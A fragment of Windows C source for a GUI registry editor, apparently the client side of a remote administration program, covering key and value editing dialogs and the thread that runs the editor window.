			
				if(GetFocus()==htv) {
					HTREEITEM hti=TreeView_GetSelection(htv);
					TreeView_EditLabel(htv,hti);
				} 
				else if(GetFocus()==hlv) {
					count=ListView_GetItemCount(hlv);
					for(i=0;i<count;i++) {
						if(ListView_GetItemState(hlv,i,LVIS_FOCUSED) & LVIS_FOCUSED) 
							break;
					}
					if(i!=count) {
						ListView_EditLabel(hlv,i);
					}
				}
			}
			return TRUE;
		case IDM_DELETE_KEY:
			{
				int i,count;
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
				HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);
			
				if(GetFocus()==htv) {
					HTREEITEM hti=TreeView_GetSelection(htv);
					if(DeleteKey(recontext,htv,hti)) {
						TreeView_DeleteItem(htv,hti);
					}
				} 
				else if(GetFocus()==hlv) {
					count=ListView_GetItemCount(hlv);
					for(i=0;i<count;i++) {
						if(ListView_GetItemState(hlv,i,LVIS_FOCUSED) & LVIS_FOCUSED) 
							break;
					}
					if(i!=count) {
						char svName[260];
						ListView_GetItemText(hlv,i,0,svName,260);
						if(DeleteValue(recontext,htv,TreeView_GetSelection(htv),svName)) {
							LVITEM lvi;
							lvi.mask=LVIF_PARAM;
							lvi.iItem=i;
							lvi.iSubItem=0;
							ListView_GetItem(hlv,&lvi);
							REGVALUE_INFO *rvi=(REGVALUE_INFO *)lvi.lParam;
							if(rvi!=NULL) {
								if(rvi->pData!=NULL) {
									free(rvi->pData);
								}
								free(rvi);
							}
							ListView_DeleteItem(hlv,i);
						}
					}
				}
			}
			return TRUE;
		case IDM_NEW_KEY:
			{
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
				
				HTREEITEM hti=TreeView_GetSelection(htv);
				if(hti==recontext->root) return FALSE;
				
				if(DialogBoxParam(g_hInstance,MAKEINTRESOURCE(IDD_NEWKEY),recontext->hDialog,NewKeyDlgProc,(LPARAM)recontext)==IDOK) {
					if(CreateNewKey(recontext,htv,hti,recontext->svKeyName)) {

						TVITEM tvi;
						tvi.hItem=hti;
						tvi.mask=TVIF_CHILDREN;
						tvi.cChildren=1;
						TreeView_SetItem(htv,&tvi);

						TVINSERTSTRUCT tvis;
						tvis.hParent=hti;
						tvis.hInsertAfter=TVI_SORT;
						tvis.item.mask=TVIF_CHILDREN|TVIF_IMAGE|TVIF_SELECTEDIMAGE|TVIF_TEXT;
						tvis.item.cChildren=0;
						tvis.item.iImage=1;
						tvis.item.iSelectedImage=2;
						tvis.item.pszText=recontext->svKeyName;
						HTREEITEM htinew=TreeView_InsertItem(htv,&tvis);
						TreeView_DeleteItem(htv,htinew);

						TreeView_Expand(htv,hti,TVE_EXPAND);
						return TRUE;
					}
				}
			}
			break;
		case IDM_NEW_STRINGVALUE:
			{
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
				HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);
				
				HTREEITEM hti=TreeView_GetSelection(htv);
				if(hti==recontext->root) return FALSE;
				
				if(DialogBoxParam(g_hInstance,MAKEINTRESOURCE(IDD_NEWVALUE),recontext->hDialog,NewKeyDlgProc,(LPARAM)recontext)==IDOK) {
					if(CreateNewValue(recontext,htv,hti,REG_SZ,recontext->svKeyName)) {
						REGVALUE_INFO *rvi=(REGVALUE_INFO *)malloc(sizeof(REGVALUE_INFO));
						lstrcpyn(rvi->svName,recontext->svKeyName,260);
						rvi->dwType=REG_SZ;
						rvi->pData=NULL;
						rvi->dwDataLen=0;
						
						LVITEM lvi;
						lvi.mask=LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;
						lvi.iItem=0;
						lvi.iSubItem=0;
						lvi.pszText=recontext->svKeyName;
						lvi.iImage=3;
						lvi.lParam=(LPARAM)rvi;
						ListView_InsertItem(hlv,&lvi);
					}
				}			
			}
			break;
		case IDM_NEW_BINARYVALUE:
			{
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
				HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);
				
				HTREEITEM hti=TreeView_GetSelection(htv);
				if(hti==recontext->root) return FALSE;
				
				if(DialogBoxParam(g_hInstance,MAKEINTRESOURCE(IDD_NEWVALUE),recontext->hDialog,NewKeyDlgProc,(LPARAM)recontext)==IDOK) {
					if(CreateNewValue(recontext,htv,hti,REG_BINARY,recontext->svKeyName)) {
						REGVALUE_INFO *rvi=(REGVALUE_INFO *)malloc(sizeof(REGVALUE_INFO));
						lstrcpyn(rvi->svName,recontext->svKeyName,260);
						rvi->dwType=REG_BINARY;
						rvi->pData=NULL;
						rvi->dwDataLen=0;
						
						LVITEM lvi;
						lvi.mask=LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;
						lvi.iItem=0;
						lvi.iSubItem=0;
						lvi.pszText=recontext->svKeyName;
						lvi.iImage=4;
						lvi.lParam=(LPARAM)rvi;
						ListView_InsertItem(hlv,&lvi);
						return TRUE;
					}
				}			
			}
			break;
		case IDM_NEW_DWORDVALUE:
			{
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
				HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);
				
				HTREEITEM hti=TreeView_GetSelection(htv);
				if(hti==recontext->root) return FALSE;
				
				if(DialogBoxParam(g_hInstance,MAKEINTRESOURCE(IDD_NEWVALUE),recontext->hDialog,NewKeyDlgProc,(LPARAM)recontext)==IDOK) {
					if(CreateNewValue(recontext,htv,hti,REG_DWORD,recontext->svKeyName)) {
						REGVALUE_INFO *rvi=(REGVALUE_INFO *)malloc(sizeof(REGVALUE_INFO));
						lstrcpyn(rvi->svName,recontext->svKeyName,260);
						rvi->dwType=REG_DWORD;
						rvi->pData=NULL;
						rvi->dwDataLen=0;
						
						LVITEM lvi;
						lvi.mask=LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;
						lvi.iItem=0;
						lvi.iSubItem=0;
						lvi.pszText=recontext->svKeyName;
						lvi.iImage=4;
						lvi.lParam=(LPARAM)rvi;
						ListView_InsertItem(hlv,&lvi);
						return TRUE;
					}
				}			
			}
			break;
		case IDM_MODIFY_VALUE:
			{
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
				HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);
				
				HTREEITEM hti=TreeView_GetSelection(htv);
				if(hti==recontext->root) return FALSE;

				// Get selected item to modify value
				int nItem=ListView_GetNextItem(hlv,-1,LVNI_SELECTED);
				if(nItem==-1) 
					return FALSE;

				LVITEM lvi;
				lvi.mask=LVIF_PARAM;
				lvi.iItem=nItem;
				lvi.iSubItem=0;
				ListView_GetItem(hlv,&lvi);
		
				// Get value information
				REGVALUE_INFO *rvi=(REGVALUE_INFO *)lvi.lParam;
				recontext->pModRvi=rvi;
				char *svRsrc;
				DLGPROC dlgProc;
									
				switch(rvi->dwType) {
				case REG_EXPAND_SZ:
				case REG_MULTI_SZ:
				case REG_SZ:
					svRsrc=MAKEINTRESOURCE(IDD_EDITSTRING);
					dlgProc=EditStringDlgProc;
					break;
				case REG_BINARY:
					svRsrc=MAKEINTRESOURCE(IDD_SUCKYEDITBINARY);
					dlgProc=SuckyEditBinaryDlgProc;
					break;
				case REG_DWORD:
					svRsrc=MAKEINTRESOURCE(IDD_EDITDWORD);
					dlgProc=EditDWORDDlgProc;
					break;
				}

				if(DialogBoxParam(g_hInstance,svRsrc,recontext->hDialog,dlgProc,(LPARAM)recontext)==IDOK) {
					if(ModifyValue(recontext,htv,hti,rvi->dwType,rvi->svName,recontext->pNewData,recontext->dwNewDataLen)) {
						if(rvi->pData!=NULL) {
							free(rvi->pData);
						}
						rvi->pData=recontext->pNewData;
						rvi->dwDataLen=recontext->dwNewDataLen;

						// Refresh values
						SelectKey(recontext, htv, TreeView_GetSelection(htv), hlv);

						return TRUE;
					}
				}
			}
			break;
		}
		return FALSE;
	case WM_DESTROY:

		// Clean up image list
		if(recontext) {
			ImageList_Destroy(recontext->hImageList);

			DestroyIcon(recontext->hSmallIcon);
			DestroyIcon(recontext->hLargeIcon);
			if(recontext->pSock!=NULL) RegeditDisconnect(recontext);

			HWND hw;
			hw=GetDlgItem(recontext->hDialog,IDC_REGTREE);
			SetWindowLong(hw,GWL_WNDPROC,GetWindowLong(hw,GWL_USERDATA));
			hw=GetDlgItem(recontext->hDialog,IDC_REGLIST);
			SetWindowLong(hw,GWL_WNDPROC,GetWindowLong(hw,GWL_USERDATA));
		}
		
		return TRUE;
	}
	
	return FALSE;
}

// RegeditThread: Registry editor thread

DWORD WINAPI RegeditThread(THREAD_ARGS *pArgs)
{
	HWND hParent,hRegeditDlg;

	// Thread housekeeping
	InterlockedIncrement(&g_nNumThreads);
	hParent=pArgs->hParent;
	free(pArgs);

	// Create context to keep vidstream info
	REGEDIT_CONTEXT *recontext=(REGEDIT_CONTEXT *) malloc(sizeof(REGEDIT_CONTEXT));	
	if(recontext==NULL) {
		InterlockedDecrement(&g_nNumThreads);
		return -1;
	}	
	recontext->hParent=hParent;
	recontext->pSock=NULL;
	
	// Create file browser window
	hRegeditDlg=CreateDialogParam(g_hInstance,MAKEINTRESOURCE(IDD_REGEDIT),hParent,RegeditDlgProc,(LPARAM)recontext);

	MSG msg;
	while(g_bActive) {
		Sleep(20);
		
		// ---------------- Handle message processing ----------------
		if(PeekMessage(&msg,NULL,0,0,PM_NOREMOVE)) {
			if(GetMessage(&msg,NULL,0,0)<=0)
				goto donereclient;
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// --------------- Handle regedit socket ------------------
		if(recontext->pSock==NULL) continue;

	}
donereclient:;
	DestroyWindow(hRegeditDlg);

	free(recontext);	
	InterlockedDecrement(&g_nNumThreads);

	return 0;
}
	

int CreateRegeditClient(HWND hParent)
{
	DWORD dwtid;
	HANDLE htd;
	
	THREAD_ARGS *pArgs=(THREAD_ARGS *) malloc(sizeof(THREAD_ARGS));
	if(pArgs==NULL) return NULL;
	
	pArgs->hParent=NULL;
	htd=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)RegeditThread,pArgs,0,&dwtid);
	if(htd==NULL) {
		return -1;
	}
	CloseHandle(htd);
	
	return 0;
}